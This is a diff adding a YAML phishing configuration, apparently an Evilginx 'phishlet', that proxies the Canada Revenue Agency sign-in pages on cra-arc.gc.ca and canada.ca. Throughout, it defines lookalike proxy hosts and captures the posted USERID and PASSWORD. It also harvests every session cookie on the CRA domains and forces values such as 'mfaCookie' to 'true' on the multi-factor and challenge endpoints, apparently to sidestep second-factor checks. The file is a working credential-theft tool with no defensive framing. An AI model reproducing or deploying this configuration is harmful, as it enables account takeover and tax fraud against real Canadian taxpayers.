@@ -1,0 +1,83 @@
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'apps1.ams-sga', orig_sub: 'apps1.ams-sga', domain: 'cra-arc.gc.ca', session: true}
+  - {phish_sub: 'apps2.ams-sga', orig_sub: 'apps2.ams-sga', domain: 'cra-arc.gc.ca', session: true}
+  - {phish_sub: 'apps3.ams-sga', orig_sub: 'apps3.ams-sga', domain: 'cra-arc.gc.ca', session: true}
+  - {phish_sub: 'apps4.ams-sga', orig_sub: 'apps4.ams-sga', domain: 'cra-arc.gc.ca', session: true}
+  - {phish_sub: 'apps5.ams-sga', orig_sub: 'apps5.ams-sga', domain: 'cra-arc.gc.ca', session: true}
+  - {phish_sub: 'apps6.ams-sga', orig_sub: 'apps6.ams-sga', domain: 'cra-arc.gc.ca', session: true}
+  - {phish_sub: 'apps7.ams-sga', orig_sub: 'apps7.ams-sga', domain: 'cra-arc.gc.ca', session: true}
+  - {phish_sub: 'apps8.ams-sga', orig_sub: 'apps8.ams-sga', domain: 'cra-arc.gc.ca', session: true}
+  - {phish_sub: 'apps9.ams-sga', orig_sub: 'apps9.ams-sga', domain: 'cra-arc.gc.ca', session: true}
+  - {phish_sub: 'apps10.ams-sga', orig_sub: 'apps10.ams-sga', domain: 'cra-arc.gc.ca', session: true}
+  - {phish_sub: 'ams-sga', orig_sub: 'ams-sga', domain: 'cra-arc.gc.ca', session: true}
+  - {phish_sub: 'cms-sgj', orig_sub: 'cms-sgj', domain: 'cra-arc.gc.ca', session: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'canada.ca', is_landing: true, session: true}
+sub_filters: []
+auth_tokens:
+  - domain: '.cra-arc.gc.ca'
+    keys: ['.*,regexp']
+  - domain: 'cms-sgj.cra-arc.gc.ca'
+    keys: ['.*,regexp']
+  - domain: '.cms-sgj.cra-arc.gc.ca'
+    keys: ['.*,regexp']
+  - domain: 'apps1.ams-sga.cra-arc.gc.ca'
+    keys: ['.*,regexp']
+  - domain: 'apps2.ams-sga.cra-arc.gc.ca'
+    keys: ['.*,regexp']
+  - domain: 'apps3.ams-sga.cra-arc.gc.ca'
+    keys: ['.*,regexp']
+  - domain: 'apps4.ams-sga.cra-arc.gc.ca'
+    keys: ['.*,regexp']
+  - domain: 'apps5.ams-sga.cra-arc.gc.ca'
+    keys: ['.*,regexp']
+  - domain: 'apps6.ams-sga.cra-arc.gc.ca'
+    keys: ['.*,regexp']
+  - domain: 'apps7.ams-sga.cra-arc.gc.ca'
+    keys: ['.*,regexp']
+  - domain: 'apps8.ams-sga.cra-arc.gc.ca'
+    keys: ['.*,regexp']
+  - domain: 'apps9.ams-sga.cra-arc.gc.ca'
+    keys: ['.*,regexp']
+  - domain: 'apps10.ams-sga.cra-arc.gc.ca'
+    keys: ['.*,regexp']
+auth_urls:
+  - '/gol-ged/mima/ngbeta'
+credentials:
+  username:
+    key: 'USERID'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'PASSWORD'
+    search: '(.*)'
+    type: 'post'
+force_post:
+  - path: '/gol-ged/awsc/amss/2fa/exempt'
+    search:
+      - {key: 'struts.token.name', search: '.*'}
+      - {key: 'acceptCookie', search: '.*'}
+    force:
+      - {key: 'acceptCookie', value: 'true'}
+    type: 'post'
+  - path: '/static/pub/AmsRpMFA.fcc'
+    search:
+      - {key: 'target', search: '.*'}
+      - {key: 'MFADELIVEREDCODE', search: '.*'}
+      - {key: 'mfaCookie', search: '.*'}
+      - {key: 'otp', search: '.*'}
+    force:
+      - {key: 'mfaCookie', value: 'true'}
+    type: 'post'
+  - path: '/gol-ged/awsc/cms/macauth/challenge/validate'
+    search:
+      - {key: 'struts.token.name', search: '.*'}
+      - {key: 'answer', search: '.*'}
+      - {key: 'token', search: '.*'}
+      - {key: 'acceptCookie', search: '.*'}
+    force:
+      - {key: 'acceptCookie', value: 'true'}
+    type: 'post'
+login:
+  domain: 'ams-sga.cra-arc.gc.ca'
+  path: '/gol-ged/awsc/amss/entry?target=login&lang=en&program=mima&idp=cms'
